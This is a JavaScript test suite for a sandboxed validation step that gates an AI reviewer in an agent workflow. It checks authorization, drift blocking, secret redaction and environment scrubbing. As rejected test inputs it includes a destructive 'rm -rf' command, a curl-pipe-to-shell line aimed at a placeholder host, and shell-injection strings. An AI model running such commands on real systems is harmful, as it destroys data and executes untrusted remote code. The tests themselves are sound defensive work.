// Independent validation evidence for `dac review`. dac executes exactly the authorized validation_commands (through an injectable,
// dedicated runner) BEFORE the read-only reviewer, binds the evidence to the exact audited content, and blocks the review on any
// failure or drift. EVERYTHING is simulated: the validation runner and the reviewer are in-process fakes; no project script, Codex
// or Cursor is ever executed (tripwire executables on PATH must stay unexecuted).
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, readFileSync, readdirSync, writeFileSync, rmSync, mkdtempSync, realpathSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import * as H from './support/run-harness.mjs';
import { makeProject, persist, projectDoc, task, impl, review, runs, reviewRunner, validationSim, implRunner, SCAFFOLD, ok, write, state, okResult } from './support/run-harness.mjs';
import { validationRunner, parseCommand, assertSafeValidationProfile, VALIDATION_MAX_CAPTURE, SANDBOX_EXEC, SANDBOX_PROFILE, SANDBOX_PROFILE_SHA256, INFRA_DIRS } from '../adapters/shared/sdd-run/validation.mjs';

after(() => { rmSync(H.scratch, { recursive: true, force: true }); });

async function ready(commands) {
  const root = makeProject({ persistDocs: !commands });
  if (commands) persist(root, { project: projectDoc({ tasks: [task({ validation_commands: commands }), task({ id: 't-feature', title: 'Add the feature', paths: ['src', 'test'], depends_on: ['t-scaffold'], validation_commands: [] })] }) });
  const r = await impl(root, { runner: implRunner(SCAFFOLD, ok()) });
  assert.equal(r.code, 0, r.out);
  const [run] = runs(root, r.st);
  return { root, st: r.st, run };
}
const sha = (f) => H.sha(readFileSync(f));
const immutableShas = (dir) => Object.fromEntries(['run.json', 'authorization.json', 'audit.json', 'diff.patch', 'outcome.json'].map((f) => [f, sha(join(dir, f))]));
const reviewFiles = (dir) => { const d = join(dir, 'reviews'); return existsSync(d) ? readdirSync(d).sort() : []; };
const promptOf = (rv) => rv.calls[0].prompt;

test('evidence delivery: dac runs exactly the authorized command in the exact worktree before the reviewer; the prompt separates the four evidence classes and binds the exact reviewed content', async () => {
  const { root, st, run } = await ready();
  const v = validationSim(); const rv = reviewRunner();
  const r = await review(root, st, { runner: rv, validator: v });
  assert.equal(r.code, 0, r.out); assert.equal(v.calls.length, 1);
  assert.deepEqual(v.calls[0].argv, ['node', '--test']); assert.equal(v.calls[0].command, 'node --test'); assert.notEqual(v.calls[0].cwd, run.run.worktree.path); assert.equal(v.calls[0].cwd, join(run.dir, 'validation', 'attempt-1', 'workspace'));
  assert.equal(rv.calls.length, 1);
  const p = promptOf(rv);
  for (const h of ['1. Implementation evidence (NOT independent)', '2. Independent validation evidence', '3. Declared controls/profile', '4. Observed actions/audit']) assert.ok(p.includes(h), h);
  assert.ok(p.indexOf('2. Independent validation evidence') < p.indexOf('## Reviewer instructions'));
  // exact binding: hashes, command, cwd, exit code, runner identity, timestamps; all inside the prompt summary
  const rec = JSON.parse(readFileSync(join(run.dir, 'validation', 'attempt-1', 'record.json'), 'utf8'));
  for (const x of [run.audit.audit_hash, run.audit.content_hash, run.audit.result_tree, run.audit.diff_sha256]) assert.ok(p.includes(x), x);
  assert.deepEqual(rec.bound, { audit_hash: run.audit.audit_hash, content_hash: run.audit.content_hash, result_tree: run.audit.result_tree, diff_sha256: run.audit.diff_sha256, base_commit: run.run.base_commit });
  assert.equal(rec.overall, 'PASS'); assert.equal(rec.binding_after, 'equal'); assert.equal(rec.runner.id, 'sim-validate');
  const c = rec.commands[0]; assert.equal(c.command, 'node --test'); assert.equal(c.cwd, join(run.dir, 'validation', 'attempt-1', 'workspace')); assert.equal(rec.source_worktree, run.run.worktree.path); assert.equal(rec.validation_cwd, c.cwd); assert.equal(rec.workspace.tree, run.audit.result_tree); assert.equal(rec.workspace.matches_audit_result_tree, true); assert.equal(c.exit_code, 0); assert.equal(c.signal, null); assert.equal(c.binding_before, 'equal');
  assert.ok(!Number.isNaN(Date.parse(c.started_at)) && !Number.isNaN(Date.parse(c.finished_at)));
  assert.equal(sha(c.stdout.file), c.stdout.sha256); assert.ok(readFileSync(c.stdout.file, 'utf8').includes('sim stdout'));
  assert.ok(p.includes(c.stdout.sha256) && p.includes(c.started_at) && p.includes('"exit_code": 0') && p.includes(rec.runner.id));
  const [rev] = runs(root, st)[0].reviews; assert.equal(rev.verdict, 'PASS'); assert.equal(rev.reviewer_invoked, true);
  assert.equal(rev.validation.attempt, 1); assert.equal(rev.validation.record_sha256, sha(join(run.dir, 'validation', 'attempt-1', 'record.json')));
  assert.equal(rev.audit_hash, run.audit.audit_hash); assert.equal(rev.content_hash, run.audit.content_hash);
  assert.equal(existsSync(H.TRIPWIRE), false);
});

test('multiple authorized commands run in order, each exactly once; the reviewer is invoked only afterwards', async () => {
  const { root, st } = await ready(['npm test', 'npm run build']);
  const order = []; const v = validationSim((argv) => { order.push(argv.join(' ')); return {}; });
  const rv = reviewRunner(() => order.push('reviewer'));
  const r = await review(root, st, { runner: rv, validator: v });
  assert.equal(r.code, 0, r.out); assert.deepEqual(order, ['npm test', 'npm run build', 'reviewer']);
});

test('a failed command (exit code, signal, spawn error) keeps the review BLOCKED and the reviewer is never invoked; the failure is recorded in full', async () => {
  for (const bad of [{ status: 1 }, { status: null, signal: 'SIGKILL' }, { status: null, error: 'ENOENT: not found' }]) {
    const { root, st, run } = await ready(['npm test', 'npm run build']);
    const v = validationSim((argv, c, n) => (n === 1 ? bad : {})); const rv = reviewRunner();
    const r = await review(root, st, { runner: rv, validator: v });
    assert.equal(r.code, 1); assert.equal(rv.calls.length, 0, 'reviewer must not run'); assert.equal(v.calls.length, 1, 'no command after a failure');
    assert.match(r.out, /BLOCKED/); assert.match(r.out, /reviewer was NOT invoked/);
    const [rev] = runs(root, st)[0].reviews; assert.equal(rev.verdict, 'BLOCKED'); assert.equal(rev.reviewer_invoked, false); assert.equal(rev.result, null);
    const rec = JSON.parse(readFileSync(join(run.dir, 'validation', 'attempt-1', 'record.json'), 'utf8'));
    assert.equal(rec.overall, 'BLOCKED'); assert.equal(rec.commands_not_run, 1); assert.equal(rec.commands.length, 1);
    assert.equal(rec.commands[0].exit_code, bad.status === 1 ? 1 : null); assert.equal(rev.validation.record_sha256, sha(join(run.dir, 'validation', 'attempt-1', 'record.json')));
  }
});

test('content altered during validation (after the last command, and before the next command) blocks the review', async () => {
  const one = await ready();
  const rv1 = reviewRunner();
  const r1 = await review(one.root, one.st, { runner: rv1, validator: validationSim((a, c) => { write(one.run.run.worktree.path, 'src/index.js', 'export const greet = () => "tampered";\n'); return {}; }) });
  assert.equal(r1.code, 1); assert.equal(rv1.calls.length, 0); assert.match(r1.out, /state drift after the validation commands: audited worktree content changed/);
  const two = await ready(['npm test', 'npm run build']);
  const rv2 = reviewRunner(); const v2 = validationSim((a, c, n) => { if (n === 1) write(two.run.run.worktree.path, 'src/extra.js', 'export const x = 1;\n'); return {}; });
  const r2 = await review(two.root, two.st, { runner: rv2, validator: v2 });
  assert.equal(r2.code, 1); assert.equal(rv2.calls.length, 0); assert.equal(v2.calls.length, 1, 'the second command must not run on drifted content'); assert.match(r2.out, /state drift before command 2/);
  assert.equal(runs(two.root, two.st)[0].reviews[0].verdict, 'BLOCKED');
});

test('Git, original project and evidence drift during validation block the review', async () => {
  const a = await ready(); const rvA = reviewRunner();
  const rA = await review(a.root, a.st, { runner: rvA, validator: validationSim(() => { write(a.root, 'README.md', '# changed during validation\n'); return {}; }) });
  assert.equal(rA.code, 1); assert.equal(rvA.calls.length, 0); assert.match(rA.out, /original project changed/);
  const b = await ready(); const rvB = reviewRunner();
  const rB = await review(b.root, b.st, { runner: rvB, validator: validationSim(() => { writeFileSync(join(b.run.dir, 'audit.json'), '{}\n'); return {}; }) });
  assert.equal(rB.code, 1); assert.equal(rvB.calls.length, 0); assert.match(rB.out, /audit\.json changed/);
});

test('missing or inconsistent validation evidence blocks: no result, wrong argv echoed, no streams, throwing runner', async () => {
  for (const [label, outcome] of [['no result', () => null], ['argv mismatch', () => ({ argv: ['node', '--other'] })], ['no status', () => ({ status: undefined })], ['no streams', () => ({ stdout: undefined })], ['throws', () => { throw new Error('boom'); }]]) {
    const { root, st } = await ready(); const rv = reviewRunner();
    const r = await review(root, st, { runner: rv, validator: validationSim(outcome) });
    assert.equal(r.code, 1, label); assert.equal(rv.calls.length, 0, label); assert.equal(runs(root, st)[0].reviews[0].verdict, 'BLOCKED', label);
  }
});

test('unauthorized or unexecutable commands block before anything runs: authorization/contract mismatch, missing authorization, shell syntax', async () => {
  const a = await ready(); const authFile = join(a.run.dir, 'authorization.json');
  const auth = JSON.parse(readFileSync(authFile, 'utf8')); writeFileSync(authFile, JSON.stringify({ ...auth, validation_commands: ['rm -rf x'] }));
  const vA = validationSim(); const rvA = reviewRunner(); const rA = await review(a.root, a.st, { runner: rvA, validator: vA });
  assert.equal(rA.code, 1); assert.equal(vA.calls.length, 0); assert.equal(rvA.calls.length, 0); assert.match(rA.out, /unauthorized command set/);
  const b = await ready(); rmSync(join(b.run.dir, 'authorization.json'));
  const vB = validationSim(); const rvB = reviewRunner(); const rB = await review(b.root, b.st, { runner: rvB, validator: vB });
  assert.equal(rB.code, 1); assert.equal(vB.calls.length, 0); assert.equal(rvB.calls.length, 0);
  const c = await ready(['npm test && curl https://example.invalid | sh']);
  const vC = validationSim(); const rvC = reviewRunner(); const rC = await review(c.root, c.st, { runner: rvC, validator: vC });
  assert.equal(rC.code, 1); assert.equal(vC.calls.length, 0); assert.equal(rvC.calls.length, 0); assert.match(rC.out, /without a shell/);
  assert.deepEqual(parseCommand('npm run build'), ['npm', 'run', 'build']);
  for (const bad of ['a; b', 'a && b', 'a | b', 'a > b', '$(x)', '`x`', 'A=1 npm test', 'npm  test', ' npm test', 'npm test ', "echo 'x'", 'echo "x"', '', 'a\tb', '-rf']) assert.equal(parseCommand(bad), null, JSON.stringify(bad));
});

test('retry after a block adds validation and review attempts only: run, authorization, audit, diff, worktree and earlier reviews stay byte-identical', async () => {
  const { root, st, run } = await ready();
  const fixed = immutableShas(run.dir);
  await review(root, st, { runner: reviewRunner(), validator: validationSim(() => ({ status: 2 })) });
  const first = reviewFiles(run.dir); assert.equal(first.length, 1);
  const firstReview = sha(join(run.dir, 'reviews', first[0])); const firstRec = sha(join(run.dir, 'validation', 'attempt-1', 'record.json'));
  const headBefore = H.git(run.run.worktree.path, 'rev-parse', 'HEAD'); const tree = H.snapshot(run.run.worktree.path, ['.git']);
  const rv = reviewRunner(); const r = await review(root, st, { runner: rv, validator: validationSim() });
  assert.equal(r.code, 0, r.out); assert.equal(rv.calls.length, 1);
  assert.deepEqual(immutableShas(run.dir), fixed); assert.equal(H.git(run.run.worktree.path, 'rev-parse', 'HEAD'), headBefore); assert.deepEqual(H.snapshot(run.run.worktree.path, ['.git']), tree);
  assert.equal(reviewFiles(run.dir).length, 2); assert.equal(sha(join(run.dir, 'reviews', first[0])), firstReview);
  assert.equal(sha(join(run.dir, 'validation', 'attempt-1', 'record.json')), firstRec); assert.ok(existsSync(join(run.dir, 'validation', 'attempt-2', 'record.json')));
  const revs = runs(root, st)[0].reviews; assert.deepEqual(revs.map((x) => x.verdict).sort(), ['BLOCKED', 'PASS']);
  assert.ok(revs.every((x) => x.audit_hash === run.audit.audit_hash));
});

test('insufficient historical scope evidence is stated honestly: "not observed" is never "did not occur"; implementer claims are labelled non-independent', async () => {
  const claim =okResult(['package.json', 'src/index.js'], { evidence: [{ description: 'ran tests', command: 'node --test', output_summary: 'all passed; no network was used' }] });
  const root2 = makeProject(); const r0 = await impl(root2, { runner: implRunner(SCAFFOLD, claim) }); assert.equal(r0.code, 0, r0.out);
  const rv = reviewRunner(); const r = await review(root2, r0.st, { runner: rv }); assert.equal(r.code, 0, r.out);
  const p = promptOf(rv);
  assert.match(p, /Absence of an observation is NOT evidence that an action did not occur/);
  assert.match(p, /Whether the implementer used the network/); assert.match(p, /Whether npm install/); assert.match(p, /Git commands that write state/);
  assert.match(p, /not_observable_by_the_audit/); assert.match(p, /verified_against_real_binary/); assert.match(p, /do not change or reinterpret the criteria/);
  assert.ok(p.includes('all passed; no network was used'), 'the claim is shown, but inside the non-independent class');
  const impIdx = p.indexOf('1. Implementation evidence (NOT independent)'); const valIdx = p.indexOf('2. Independent validation evidence');
  assert.ok(impIdx < p.indexOf('no network was used') && p.indexOf('no network was used') < valIdx, 'implementer claim lives only in class 1');
  assert.doesNotMatch(p.replace('all passed; no network was used', ''), /no network (access )?(occurred|was used)|did not (use|access) the network/i, 'dac itself never asserts the absence of network use');
  assert.equal(existsSync(H.TRIPWIRE), false);
});

test('captured output is bounded and redacted for the reviewer; the full raw record stays outside the project', async () => {
  const { root, st, run } = await ready();
  const big = `${'line of output\n'.repeat(5000)}api_key=SUPERSECRETVALUE12345\nfinal tail line\n`;
  const rv = reviewRunner(); const r = await review(root, st, { runner: rv, validator: validationSim(() => ({ stdout: big })) });
  assert.equal(r.code, 0, r.out); const p = promptOf(rv);
  assert.ok(!p.includes('SUPERSECRETVALUE12345')); assert.ok(p.includes('final tail line')); assert.ok(p.length < big.length, 'prompt does not carry the full output');
  const rec = JSON.parse(readFileSync(join(run.dir, 'validation', 'attempt-1', 'record.json'), 'utf8'));
  assert.ok(readFileSync(rec.commands[0].stdout.file, 'utf8').includes('SUPERSECRETVALUE12345'), 'full record is raw');
  assert.ok(!rec.commands[0].stdout.file.startsWith(root)); assert.equal(rec.commands[0].stdout.bytes_total, Buffer.byteLength(big));
});

test('validation records are exclusive-create: nothing is overwritten and attempts are numbered', async () => {
  const { root, st, run } = await ready();
  for (let i = 0; i < 3; i++) await review(root, st, { runner: reviewRunner(), validator: validationSim() });
  assert.deepEqual(readdirSync(join(run.dir, 'validation')).sort(), ['attempt-1', 'attempt-2', 'attempt-3']);
});

test('runner injection: the validator must be a distinct, shell-free "validate" runner; the production runner is direct argv with an allowlisted env', async () => {
  const { root, st } = await ready();
  for (const bad of [validationSim(undefined, { id: 'sim-review' }), validationSim(undefined, { id: 'sim-implement' }), validationSim(undefined, { role: 'review' }), validationSim(undefined, { profile: { shell: true } }), validationSim(undefined, { profile: { bypass: true } })]) {
    const rv = reviewRunner(); const r = await review(root, st, { runner: rv, validator: bad });
    assert.equal(r.code, 'UNSAFE_PROFILE'); assert.equal(rv.calls.length, 0); assert.equal(bad.calls.length, 0);
  }
  assert.equal(runs(root, st)[0].reviews.length, 0);
  const calls = []; const spawn = (bin, args, opts) => { calls.push({ bin, args, opts }); return { status: 0, signal: null, stdout: 'o', stderr: 'e' }; };
  const prev = process.env.OPENAI_API_KEY; process.env.OPENAI_API_KEY = 'sk-should-not-leak-12345';
  try {
    const ws = realpathSync(mkdtempSync(join(tmpdir(), 'dac-ws-')));
    const parentEnv = { ...process.env, OPENAI_API_KEY: 'sk-x', ANTHROPIC_API_KEY: 'k', NPM_TOKEN: 't', npm_config__authToken: 'a', NODE_OPTIONS: '--require x' };
    const runner = validationRunner({ spawn, platform: 'darwin', sandboxAvailable: () => true, parentEnv }); const prof = assertSafeValidationProfile(runner, 'x');
    const out = await runner.run({ argv: ['npm', 'test'], cwd: ws });
    assert.equal(calls[0].bin, SANDBOX_EXEC); assert.equal(calls[0].opts.shell, false); assert.equal(calls[0].opts.cwd, ws);
    assert.deepEqual(calls[0].args, ['-D', `WORKSPACE=${ws}`, '-p', SANDBOX_PROFILE, 'npm', 'test']);
    assert.match(SANDBOX_PROFILE, /\(deny network\*\)/); assert.match(SANDBOX_PROFILE, /\(deny file-write\*\)/);
    assert.match(SANDBOX_PROFILE, /\(allow file-write\* \(subpath \(param "WORKSPACE"\)\) \(literal "\/dev\/null"\)\)/);
    assert.equal(prof.isolation.backend, 'macos-sandbox-exec'); assert.equal(prof.isolation.profile_sha256, SANDBOX_PROFILE_SHA256);
    const env = calls[0].opts.env;
    for (const k of ['OPENAI_API_KEY', 'ANTHROPIC_API_KEY', 'NPM_TOKEN', 'npm_config__authToken', 'NODE_OPTIONS']) assert.equal(k in env, false, k);
    assert.equal(env.CI, '1'); assert.equal(env.HOME, join(ws, INFRA_DIRS.home)); assert.equal(env.TMPDIR, join(ws, INFRA_DIRS.tmp)); assert.equal(env.npm_config_cache, join(ws, INFRA_DIRS.npm_cache));
    for (const d of Object.values(INFRA_DIRS)) assert.equal(existsSync(join(ws, d)), true);
    assert.equal(out.status, 0); assert.deepEqual(out.argv, ['npm', 'test']); // logical argv stays the authorized argv
    // fail closed: no direct spawn on non-darwin or when sandbox-exec is unusable
    const before = calls.length;
    for (const bad of [validationRunner({ spawn, platform: 'linux', parentEnv }), validationRunner({ spawn, platform: 'darwin', sandboxAvailable: () => false, parentEnv })]) assert.throws(() => bad.run({ argv: ['npm', 'test'], cwd: ws }), /BLOCKED/);
    assert.equal(calls.length, before);
    rmSync(ws, { recursive: true, force: true });
  } finally { if (prev === undefined) delete process.env.OPENAI_API_KEY; else process.env.OPENAI_API_KEY = prev; }
  assert.ok(VALIDATION_MAX_CAPTURE > 0); assert.equal(existsSync(H.TRIPWIRE), false);
});
